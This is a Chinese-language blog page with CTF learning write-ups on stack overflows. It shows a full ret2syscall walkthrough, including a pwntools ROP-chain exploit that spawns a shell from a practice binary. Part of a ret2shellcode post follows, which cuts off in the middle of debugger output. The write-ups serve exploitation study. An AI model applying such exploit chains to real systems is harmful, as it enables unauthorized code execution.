<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="s0nnse">
<meta property="og:url" content="https://github.com/s0nnse/index.html">
<meta property="og:site_name" content="s0nnse">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="s0nnse">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/s0nnse/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>s0nnse</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">s0nnse</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/06/01/%E4%BB%8Eret2syscall%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/01/%E4%BB%8Eret2syscall%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2syscall入坑栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-06-01 22:04:31" itemprop="dateCreated datePublished" datetime="2020-06-01T22:04:31+08:00">2020-06-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-11 21:15:58" itemprop="dateModified" datetime="2020-06-11T21:15:58+08:00">2020-06-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="ret2syscall原理"><a href="#ret2syscall原理" class="headerlink" title="ret2syscall原理"></a>ret2syscall原理</h4><p>ret2syscall即控制程序执行系统调用，获取shell。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctf-wiki</a>中的ret2syscall程序为例，主要内容与ctf-wiki一致，其中穿插补充一些学习中所遇到的疑惑点。</p>
<p>首先检测程序开启的保护。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ret2syscall</span><br><span class="line">[*] '/home/kali/PWN/ret2syscall'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以得知为32位程序，开启NX保护（即No-eXecute，也就是数据不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。）</p>
<p>通过IDA查看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p>
<p>关于系统调用的知识，请参考</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/系统调用" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
</ul>
<p>这里把wiki中的关键信息摘抄一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">应用程序调用系统调用的过程是：</span><br><span class="line"></span><br><span class="line">1. 把系统调用的编号存入 EAX；</span><br><span class="line">2. 把函数参数存入其它通用寄存器；</span><br><span class="line">3. 触发 0x80 号中断（int 0x80）。</span><br></pre></td></tr></table></figure>

<p>只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>控制这些寄存器的值需要使用gadgets。比如说现在栈顶是10，此时如果执行<code>pop eax</code>，那么现在eax的值就是10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
<p>首先，我们来寻找控制 eax 的 gadgets</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --only 'pop|ret' |grep 'eax'</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p>可以看到有上述几个都可以控制 eax，这里选取第二个来作为 gadgets。</p>
<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --only 'pop|ret' |grep 'ebx'</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>这里选择</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>这个可以直接控制其它三个寄存器。</p>
<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p>此外，还有 int 0x80 的地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/ROPgadget$ python3 ROPgadget.py --binary /home/kali/PWN/codes/ret2syscall --only 'int'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>

<p>下面编写相应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>尝试运行一下，成功获取shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN/codes$ python3 ret2syscall.py </span><br><span class="line">[+] Starting local process './ret2syscall': pid 11735</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">This time, no system() and NO SHELLCODE!!!</span><br><span class="line">What do you plan to do?</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">ret2shellcode      ret2syscall      ret2text     test</span><br><span class="line">ret2shellcode.py  ret2syscall.py  ret2text.py  test.c</span><br></pre></td></tr></table></figure>

<p>ret2syscall主要通过系统调用来获取shell，这里如果了解过汇编的知识，我想会比较容易理解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/31/%E4%BB%8Eret2shellcode%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/31/%E4%BB%8Eret2shellcode%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2shellcode入坑栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-31 20:12:30" itemprop="dateCreated datePublished" datetime="2020-05-31T20:12:30+08:00">2020-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-01 22:02:56" itemprop="dateModified" datetime="2020-06-01T22:02:56+08:00">2020-06-01</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="ret2shellcode原理"><a href="#ret2shellcode原理" class="headerlink" title="ret2shellcode原理"></a>ret2shellcode原理</h4><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<p>栈溢出的基本概念在ret2text中介绍过，这里不再重复，直接分析一个程序。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctf-wiki</a>中的ret2shellcode程序为例，主要内容与ctf-wiki一致，其中穿插补充一些学习中所遇到的疑惑点。</p>
<p>首先常规的先检测程序开启的保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ret2shellcode</span><br><span class="line">[*] '/home/kali/PWN/ret2shellcode'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看到是一个32位程序，而且几乎没有开启任何保护，丢进IDA看一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单查看，可以看到输入数据读到s变量中，再复制到buf2处，这里因为代码里没有自带的system等获取shell的函数，所以不能使用ret2text，需要自己写入调用的函数。</p>
<p>这里先引入一下内存分配区域的知识</p>
<p>32位操作系统下为：1G内核态，3G用户态</p>
<p>BSS段 ：通常是指用来存放程序中未初始化的全局变量、静态变量（全局变量未初始化时默认为0）的一块内存区域</p>
<p>数据段（data） ：通常是指用来存放程序中 初始化后的全局变量和静态变量</p>
<p>代码段（text） ：通常是指用来存放程序中 代码和常量</p>
<p>堆（heap） ：通常是指用来存放程序中进程运行时被动态分配的内存段 ( 动态分配：malloc / new，者动态释放：free / delete)</p>
<p>栈 （stack）：通常是指用来存放程序中用户临时创建的局部变量、函数形参、数组（局部变量未初始化则默认为垃圾值）也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待调用结束后，函数的返回值也会被存放回栈中。由于栈的先进后出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。它是由操作系统分配的，内存的申请与回收都由OS管理。</p>
<p>这里有个疑惑，s变量读入了数据，为什么不把shellcode直接写入s变量所在的空间执行，反而要多走一步到bss段再执行。变量s是保存在栈中的，而且NX disabled栈保护是关闭的。<strong>难道是因为s对应的地址是未知的？，留坑，没完全明白。</strong></p>
<p>接下来在IDA中通过双击buf2，查看buf2的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure>

<p>查看可知buf2在bss段，有100个字节空间长度，在解释一下<code>db 64h dup(?)</code>的含义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db： 定义字节类型变量的伪指令</span><br><span class="line">dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定</span><br><span class="line">?： 只分配存储空间，不指定初值</span><br></pre></td></tr></table></figure>

<p>接下来简单调试下程序，看看这里的bss段是否可以执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from ret2shellcode...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/kali/PWN/ret2shellcode </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8       ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────[ REGISTERS ]─────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb6808 (environ) —▸ 0xffffd39c —▸ 0xffffd531 ◂— 'SHELL=/bin/bash'</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x4e9a5ff3</span><br><span class="line"> EDX  0xffffd324 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line"> ESI  0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line"> EBP  0xffffd2f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd270 —▸ 0xf7f5bc92 ◂— pop    edi /* '__vdso_clock_gettime' */</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">──────────────────────────────────────[ DISASM ]──────────────────────────────────────</span><br><span class="line"> ► 0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [0x804a060]</span><br><span class="line">    ↓</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048553 &lt;main+38&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt &lt;0x8048410&gt;</span><br><span class="line"> </span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0] &lt;0x804a040&gt;</span><br><span class="line">   0x8048560 &lt;main+51&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048568 &lt;main+59&gt;    mov    dword ptr [esp + 8], 1</span><br><span class="line">   0x8048570 &lt;main+67&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048578 &lt;main+75&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x804857b &lt;main+78&gt;    call   setvbuf@plt &lt;0x8048410&gt;</span><br><span class="line">──────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd270 —▸ 0xf7f5bc92 ◂— pop    edi /* '__vdso_clock_gettime' */</span><br><span class="line">01:0004│      0xffffd274 —▸ 0xf7ffdc40 —▸ 0xf7fd3000 ◂— jg     0xf7fd3047</span><br><span 